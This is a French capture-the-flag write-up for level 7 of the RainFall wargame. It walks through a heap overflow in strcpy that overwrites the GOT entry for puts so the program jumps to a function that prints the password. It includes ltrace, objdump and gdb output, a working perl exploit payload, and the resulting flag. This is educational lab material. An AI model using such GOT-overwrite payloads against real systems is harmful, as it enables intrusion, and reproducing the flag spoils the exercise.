# level7

Le programme met le mot de passe dans une variable globale `c` mais n'en fait rien, en revanche, on voit que la fonction `m` pourrait potentiellement l'afficher

On va donc devoir trouver un moyen de faire un appel à `m()` en utilisant un buffer overflow avec les deux arguments copiés par `strcpy`

On commence par trouver l'offset de l'overflow en utilisant le même outil que pour les exercices précédents:
```sh
level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
__libc_start_main(0x8048521, 2, 0xbffff724, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                        = 0x0804a008
malloc(8)                                                        = 0x0804a018
malloc(8)                                                        = 0x0804a028
malloc(8)                                                        = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)        = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
On trouve un offset de 20 en passant l'adresse donnée en argument au 2ème strcpy

Pour construire not payload, on va utiliser un GOT overwrite comme pour les exercices précédents, on va donc avoir besoin de l'adresse de la fonction que l'on veut overwrite, à savoir `puts`

```sh
level7@RainFall:~$ objdump -R level7 

level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```

On récupère ensuite l'adresse de la fonction `m()` avec gdb 
```sh
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:    push   %ebp
   0x080484f5 <+1>:    mov    %esp,%ebp
   0x080484f7 <+3>:    sub    $0x18,%esp
   0x080484fa <+6>:    movl   $0x0,(%esp)
   0x08048501 <+13>:    call   0x80483d0 <time@plt>
   0x08048506 <+18>:    mov    $0x80486e0,%edx
   0x0804850b <+23>:    mov    %eax,0x8(%esp)
   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:    mov    %edx,(%esp)
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
   0x0804851f <+43>:    leave  
   0x08048520 <+44>:    ret    
End of assembler dump.
```

On connait désormais l'adresse à overwrite: `0x08049928` et l'adresse par laquelle on veut la remplacer: `0x080484f4`, ainsi que l'offset: `20`

Notre payload sera donc: padding (20 characteres) + addresse GOT + adresse de `m()`

L'adresse de `m()` sera donc dans le 2ème argument.

```sh
level7@RainFall:~$ ./level7 $(perl -e 'print "A"x20 ."\x28\x99\x04\x08";' ) $(perl -e 'print "\xf4\x84\x04\x08";') 
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1708682178
```

